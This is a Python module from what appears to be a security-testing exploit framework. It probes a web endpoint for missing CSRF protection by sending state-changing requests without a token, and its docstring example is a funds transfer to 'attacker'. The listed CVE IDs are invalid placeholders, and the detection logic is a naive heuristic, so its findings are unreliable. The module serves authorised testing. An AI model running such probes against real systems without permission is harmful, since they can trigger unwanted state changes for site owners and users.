"""
CSRF Exploit (CWE-352) - Cross-Site Request Forgery attack.

Tests for missing CSRF tokens in state-changing operations.

Author: MAXIMUS Wargaming Team
Date: 2025-10-11
"""

import asyncio
import httpx
import time
from typing import Dict

from exploit_database import ExploitResult, ExploitStatus, ExploitCategory


# Exploit Metadata
EXPLOIT_ID = "cwe_352_csrf"
NAME = "Cross-Site Request Forgery (CSRF)"
DESCRIPTION = "Tests for missing CSRF protection on state-changing endpoints"
CATEGORY = "csrf"
CWE_IDS = ["CWE-352"]
CVE_EXAMPLES = [
    "CVE-2024-CSRF-001",
    "CVE-2023-CSRF-456",
]


async def execute(
    target_url: str,
    timeout: int = 30,
    **kwargs
) -> ExploitResult:
    """
    Execute CSRF exploit.
    
    Args:
        target_url: Target application URL (e.g., "http://localhost:8080/api/transfer")
        timeout: Max execution time in seconds
        **kwargs: Additional parameters (method, body, etc)
    
    Returns:
        ExploitResult with success=True if CSRF attack worked
    
    Strategy:
        1. Attempt state-changing request WITHOUT CSRF token
        2. If succeeds (2xx response), CSRF vulnerability exists
        3. Check for common CSRF protection headers
    
    Example:
        >>> result = await execute(
        ...     "http://vuln-app/api/transfer",
        ...     method="POST",
        ...     body={"to": "attacker", "amount": 1000}
        ... )
    """
    start_time = time.time()
    output_lines = []
    
    try:
        method = kwargs.get("method", "POST").upper()
        body = kwargs.get("body", {"action": "test", "value": "csrf_test"})
        
        output_lines.append(f"Testing CSRF on: {target_url}")
        output_lines.append(f"Method: {method}")
        
        async with httpx.AsyncClient(timeout=timeout, follow_redirects=True) as client:
            # Test 1: Request without CSRF token
            output_lines.append("\n[Test 1] Sending request WITHOUT CSRF token...")
            
            try:
                if method == "POST":
                    response = await client.post(target_url, json=body)
                elif method == "PUT":
                    response = await client.put(target_url, json=body)
                elif method == "DELETE":
                    response = await client.delete(target_url)
                else:
                    response = await client.request(method, target_url, json=body)
                
                output_lines.append(f"Response status: {response.status_code}")
                
                # Success indicators: state change accepted without CSRF token
                if response.status_code in [200, 201, 204]:
                    output_lines.append("✓ State-changing request succeeded WITHOUT CSRF token!")
                    output_lines.append("✓ CSRF VULNERABILITY CONFIRMED")
                    
                    # Check for CSRF protection headers
                    csrf_headers = [
                        "X-CSRF-Token",
                        "X-XSRF-Token",
                        "CSRF-Token",
                    ]
                    
                    has_csrf_header = any(h in response.headers for h in csrf_headers)
                    
                    if not has_csrf_header:
                        output_lines.append("✓ No CSRF protection headers found")
                    
                    duration = time.time() - start_time
                    
                    return ExploitResult(
                        exploit_id=EXPLOIT_ID,
                        category=ExploitCategory.CSRF,
                        status=ExploitStatus.SUCCESS,
                        success=True,
                        output="\n".join(output_lines),
                        error=None,
                        duration_seconds=duration,
                        metadata={
                            "status_code": response.status_code,
                            "csrf_headers_present": has_csrf_header,
                            "method": method,
                        }
                    )
                
                # Request blocked or error (CSRF protection likely present)
                elif response.status_code in [403, 401, 400]:
                    output_lines.append(f"✗ Request blocked: {response.status_code}")
                    output_lines.append("✗ CSRF protection likely present")
                    
                    duration = time.time() - start_time
                    
                    return ExploitResult(
                        exploit_id=EXPLOIT_ID,
                        category=ExploitCategory.CSRF,
                        status=ExploitStatus.FAILED,
                        success=False,
                        output="\n".join(output_lines),
                        error=None,
                        duration_seconds=duration,
                        metadata={
                            "status_code": response.status_code,
                            "method": method,
                        }
                    )
                
                else:
                    output_lines.append(f"✗ Unexpected status: {response.status_code}")
                    duration = time.time() - start_time
                    
                    return ExploitResult(
                        exploit_id=EXPLOIT_ID,
                        category=ExploitCategory.CSRF,
                        status=ExploitStatus.FAILED,
                        success=False,
                        output="\n".join(output_lines),
                        error=None,
                        duration_seconds=duration,
                        metadata={"status_code": response.status_code}
                    )
            
            except httpx.HTTPError as e:
                output_lines.append(f"HTTP error: {e}")
                duration = time.time() - start_time
                
                return ExploitResult(
                    exploit_id=EXPLOIT_ID,
                    category=ExploitCategory.CSRF,
                    status=ExploitStatus.ERROR,
                    success=False,
                    output="\n".join(output_lines),
                    error=str(e),
                    duration_seconds=duration,
                    metadata={}
                )
    
    except asyncio.TimeoutError:
        output_lines.append("✗ Exploit timeout")
        
        return ExploitResult(
            exploit_id=EXPLOIT_ID,
            category=ExploitCategory.CSRF,
            status=ExploitStatus.TIMEOUT,
            success=False,
            output="\n".join(output_lines),
            error="Timeout after {timeout}s",
            duration_seconds=timeout,
            metadata={}
        )
    
    except Exception as e:
        output_lines.append(f"✗ Exploit error: {e}")
        
        return ExploitResult(
            exploit_id=EXPLOIT_ID,
            category=ExploitCategory.CSRF,
            status=ExploitStatus.ERROR,
            success=False,
            output="\n".join(output_lines),
            error=str(e),
            duration_seconds=time.time() - start_time,
            metadata={}
        )


# Convenience function
async def test_csrf(target_url: str, method: str = "POST", body: Dict = None) -> bool:
    """
    Quick CSRF test.
    
    Returns:
        True if CSRF vulnerability exists
    
    Example:
        >>> vulnerable = await test_csrf("http://localhost:8080/api/transfer")
    """
    result = await execute(target_url, method=method, body=body or {})
    return result.success
